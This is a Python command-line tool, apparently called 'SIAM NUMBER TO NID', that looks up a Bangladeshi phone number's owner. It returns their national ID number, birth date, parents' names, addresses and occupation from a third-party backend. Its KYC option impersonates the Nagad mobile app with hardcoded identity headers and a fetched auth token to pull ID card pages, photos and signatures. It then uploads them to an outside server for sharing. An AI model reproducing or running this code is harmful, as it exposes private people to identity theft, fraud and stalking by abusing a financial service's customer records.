import os, time, json, sys, random, string, webbrowser, uuid, requests
blueVal = "94m"
redVal = "91m"
greenVal = "32m"
whiteVal = "97m"
yellowVal = "93m"
cyanVal = "96m"
# normal
normal = "\33["
# Bold
bold = "\033[1;"
# italic
italic = "\x1B[3m"
# Color Normal
blue = normal + blueVal  # Blue Color Normal
red = normal + redVal  # Red Color Normal
green = normal + greenVal  # Green Color Normal
white = normal + whiteVal  # white Color Normal
yellow = normal + yellowVal  # yellow Color Normal
cyan = normal + cyanVal  # Cyan Color Normal
# Color Bold
blueBold = bold + blueVal  # Blue Color Bold
redBold = bold + redVal  # Red Color Bold
greenBold = bold + greenVal  # Green Color Bold
whiteBold = bold + whiteVal  # white Color Bold
yellowBold = bold + yellowVal  # yellow Color Bold
cyanBold = bold + cyanVal  # Cyan Color Bold
version = "2.1.6"
# oparetor
robi = "018"
airtel = "016"
grameenohone = "017"
grameenohone_miror = "013"
banglalink = "019"
banglalink_miror = "014"
teletalk = "015"
global oparetor
global number, country_valid, amount,choosed,numbers
# color end
end = '\033[0m'
colorArr = ["\033[1;91m", "\033[1;92m", "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m"]
def colorize(text, color_code):
    return f"\033[{color_code}m{text}\033[0m"
def printchar(w, t): 
    for word in w + '\n':
        sys.stdout.write(word)
        sys.stdout.flush()
        time.sleep(t)
def clr():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
def banner():
    s = random.choice(colorArr)
    i = random.choice(colorArr)
    a = random.choice(colorArr)
    m = random.choice(colorArr)
    logo = f'''
{s} ██████ {i}██ {a} █████ {m} ███    ███
{s}██      {i}██ {a}██   ██{m} ████  ████
{s} █████  {i}██ {a}███████{m} ██ ████ ██
{s}     ██ {i}██ {a}██   ██{m} ██  ██  ██
{s}██████  {i}██ {a}██   ██{m} ██      ██
	'''
    infoC = random.choice(colorArr)
    toolsInfo = f'''{infoC}
╔══════════════════════════════════════╗
║       {random.choice(colorArr)}SIAM NUMBER TO NID {infoC}            ║
║       {random.choice(colorArr)}AUTHOR: SIAM RAHMAN {infoC}           ║
║       {random.choice(colorArr)}TELEGRAM : @httpsiam  {infoC}         ║
╚══════════════════════════════════════╝
    '''
    clr()
    print(logo)
    print(toolsInfo)

def httpsiam():
    banner()
    try:
        pwd = requests.get("https://pastebin.com/raw/ubtYmYzf").text.strip()
    except requests.RequestException as e:
        print(f"Error fetching password: {e}")
        return
    password = input(f"{random.choice(colorArr)}ENTER PASSWORD: {end}")

    if password == pwd:
        main()
    else:
        printchar(f"{random.choice(colorArr)}PASSWORD INCORRECT :){end}", 0.03)
        httpsiam()
def tg():
    if os.name == 'nt':
        webbrowser.open('https://t.me/httpsiam')
    else:
        os.system('xdg-open https://t.me/httpsiam')
def hulf():
    banner()
    number = str(input(f"  {random.choice(colorArr)}  ENTER NUMBER: {random.choice(colorArr)}"))
    if number == "":
        printchar(f"{red}    EMPTY INPUT", 0.05)
        time.sleep(2)
        clr()
        banner()
    resp_siam = requests.get(f"https://ninfo.backendsiam.repl.co/api/siam/info/{number}")
    name = resp_siam.json()["resp"].get("name", None)
    mno = resp_siam.json()["resp"].get("mnoName", None)
    nid = resp_siam.json()["resp"].get("photoId", None)

    dob_raw = resp_siam.json()["resp"].get("dob", None)
    dob = f"{dob_raw[:4]}-{dob_raw[4:6]}-{dob_raw[6:]}" if dob_raw else None

    asp_additional_data = resp_siam.json()["resp"].get("aspAdditionalData", {})
    fatherName = asp_additional_data.get("fatherName", None)
    motherName = asp_additional_data.get("motherName", None)
    permanentAddress = asp_additional_data.get("permanentAddress", None)
    presentAddress = asp_additional_data.get("presentAddress", None)
    occupation = asp_additional_data.get("occupation", None)
    gender = resp_siam.json()["resp"].get("gender", None)
    infoC = random.choice(colorArr)
    Info = (f'{infoC}\n'
                f'════════════════════════════\n'
                f'{random.choice(colorArr)}  PHONE : {random.choice(colorArr)}{number}       \n'
                f'{random.choice(colorArr)}  NAME : {random.choice(colorArr)}{name}       \n'
                f'{random.choice(colorArr)}  BRAND : {random.choice(colorArr)}{mno}        \n'
                f'{random.choice(colorArr)}  NID : {random.choice(colorArr)}{nid} \n'
                f'{random.choice(colorArr)}  DOB : {random.choice(colorArr)}{dob}\n'
                f'{random.choice(colorArr)}  FATHER : {random.choice(colorArr)}{fatherName} \n'
                f'{random.choice(colorArr)}  MOTHER : {random.choice(colorArr)}{motherName} \n'
                f'{random.choice(colorArr)}  PERMANENT ADDRESS : {random.choice(colorArr)}{permanentAddress} \n'
                f'{random.choice(colorArr)}  PRESENT ADDRESS : {random.choice(colorArr)}{presentAddress} \n'
                f'{random.choice(colorArr)}  OCCUPATION : {random.choice(colorArr)}{occupation} \n'
                f'{random.choice(colorArr)}  GENDER : {random.choice(colorArr)}{gender}\n'
                f'{infoC}═════════════════════\n'
                f'    ')
    clr()
    banner()
    print(Info)
    printchar(f"{infoC}CLICK CTRL+C TO EXIT !\n\n CLICK ENTER TO MAIN MENU !", 0.05)
    input()
    main()
    sys.exit()
def main():
    banner()
    option()
    input_options = str(input(f"  {random.choice(colorArr)}  CHOOSE A OPTION: {random.choice(colorArr)}"))
    if input_options == "1":
        clr()
        banner()
        hulf()
    elif input_options == "2":
        full()
    if input_options == "":
        printchar(f"{red}    EMPTY INPUT", 0.05)
        time.sleep(2)
        clr()
        main()
def option():
    option = f'''{random.choice(colorArr)}
    [1] NUMBER TO NID
    [2] NUMBER TO KYC
    ''' + end
    printchar(option, 0.05)
def full():
    clr()
    banner()
    number = str(input(f"  {random.choice(colorArr)}  ENTER NUMBER: {random.choice(colorArr)}"))
    if number == "":
        printchar(f"{red}    EMPTY INPUT", 0.05)
        main()
        time.sleep(2)
        clr()
        banner()

    url = f"https://ninfo.backendsiam.repl.co/api/siam/info/full/{number}"
    token_resp = requests.get("https://ninfo.backendsiam.repl.co/api/siam/info/token")
    token = token_resp.json()["X-KM-AUTH-TOKEN"]

    headers = {
        "X-KM-UserId": "96414607",
        "X-KM-AppCode": "01",
        "X-KM-AUTH-TOKEN": token,
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G532F Build/MMB29T)",
        "X-KM-User-AspId": "100012345612345",
        "X-KM-User-Agent": "ANDROID/1152",
        "X-KM-User-MpaId": "17026177920306481310708146450732",
        "Host": "app.mynagad.com:20002",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
    }

    response = requests.get(url)
    response_json = response.json()

    if response.status_code == 400:
        errorprint = (f'''{random.choice(colorArr)}
╔══════════════════════════════════════╗
║          INFO NOT IN SERVER          ║
╚══════════════════════════════════════╝''')
        clr()
        banner()
        printchar(errorprint, 0.05)
    else:
        if response.status_code == 200:
            page1 = response_json.get("page1_url", None)
            page2 = response_json.get("page2_url", None)
            profile_url = response_json.get("profile_url", None)
            signature_url = response_json.get("signature_url", None)
                
            def download_and_upload(url, file_name):
                resp = requests.get(url, headers=headers)
                if resp.status_code == 200:
                    upload_url = "https://lll.backendsiam.repl.co/upload"
                    files = {'file': (file_name, resp.content, 'application/octet-stream')}
                    upload_response = requests.post(upload_url, files=files)
            Info = f'{random.choice(colorArr)}\n' \
                   f'══════════════════════════════════════════════════════════════\n'
            if page1 and page1 != "null":
                download_and_upload(page1, f"{number}_page_1.jpg")
                Info += f'     {random.choice(colorArr)}  PAGE 1 : {random.choice(colorArr)}https://lll.backendsiam.repl.co/get_image/{number}_page_1.jpg       \n'
            if page2 and page2 != "null":
                download_and_upload(page2, f"{number}_page_2.jpg")
                Info += f'     {random.choice(colorArr)}  PAGE 2 : {random.choice(colorArr)}https://lll.backendsiam.repl.co/get_image/{number}_page_2.jpg       \n'
            if profile_url and profile_url != "null":
                download_and_upload(profile_url, f"{number}_profile.jpg")
                Info += f'     {random.choice(colorArr)}  PROFILE : {random.choice(colorArr)}https://lll.backendsiam.repl.co/get_image/{number}_profile.jpg       \n'
            if signature_url and signature_url != "null":
                download_and_upload(signature_url, f"{number}_signature.jpg")
                Info += f'     {random.choice(colorArr)}  SIGNATURE : {random.choice(colorArr)}https://lll.backendsiam.repl.co/get_image/{number}_signature.jpg       \n'
            Info += f'{random.choice(colorArr)}════════════════════════════════════════════════════════\n' \
                    f'    '   
            clr()
            banner()
            printchar(Info, 0.01)
            printchar(f"{random.choice(colorArr)}CLICK CTRL+C TO EXIT !\n\n CLICK ENTER TO MAIN MENU !", 0.05)
            input()
            main()